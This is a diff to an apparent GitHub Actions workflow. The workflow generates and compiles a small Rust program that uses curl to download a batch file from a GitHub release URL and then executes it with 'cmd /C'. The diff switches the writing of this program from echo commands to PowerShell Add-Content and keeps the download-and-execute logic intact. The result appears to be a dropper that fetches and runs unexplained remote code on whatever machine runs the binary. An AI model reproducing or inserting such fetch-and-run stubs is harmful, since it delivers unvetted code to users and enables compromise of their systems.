@@ -30,21 +30,22 @@ jobs:
 
     - name: Create Rust file
       run: |
-        echo use std::process::Command\; > script.rs
-        echo fn main() \{ >> script.rs
-        echo Command::new\(\"curl\"\) >> script.rs
-        echo .arg\(\"-L\"\) >> script.rs
-        echo .arg\(\"-o\"\) >> script.rs
-        echo .arg\(\"download.bat\"\) >> script.rs
-        echo .arg\(\"https://github.com/43a1723/test/releases/download/AutoBuild/download.bat\"\) >> script.rs
-        echo .status\(\) >> script.rs
-        echo .expect\(\"Failed to download file\"\)\; >> script.rs
-        echo Command::new\(\"cmd\"\) >> script.rs
-        echo .arg\(\"/C\"\) >> script.rs
-        echo .arg\(\"download.bat\"\) >> script.rs
-        echo .status\(\) >> script.rs
-        echo .expect\(\"Failed to execute batch file\"\)\; >> script.rs
-        echo \} >> script.rs
+        Add-Content -Path script.rs -Value 'use std::process::Command;'
+        Add-Content -Path script.rs -Value 'fn main() {'
+        Add-Content -Path script.rs -Value '    Command::new("curl")'
+        Add-Content -Path script.rs -Value '        .arg("-L")'
+        Add-Content -Path script.rs -Value '        .arg("-o")'
+        Add-Content -Path script.rs -Value '        .arg("download.bat")'
+        Add-Content -Path script.rs -Value '        .arg("https://github.com/43a1723/test/releases/download/AutoBuild/download.bat")'
+        Add-Content -Path script.rs -Value '        .status()'
+        Add-Content -Path script.rs -Value '        .expect("Failed to download file");'
+        Add-Content -Path script.rs -Value ''
+        Add-Content -Path script.rs -Value '    Command::new("cmd")'
+        Add-Content -Path script.rs -Value '        .arg("/C")'
+        Add-Content -Path script.rs -Value '        .arg("download.bat")'
+        Add-Content -Path script.rs -Value '        .status()'
+        Add-Content -Path script.rs -Value '        .expect("Failed to execute batch file");'
+        Add-Content -Path script.rs -Value '}'
 
     - name: Compile Rust Script
       run: |
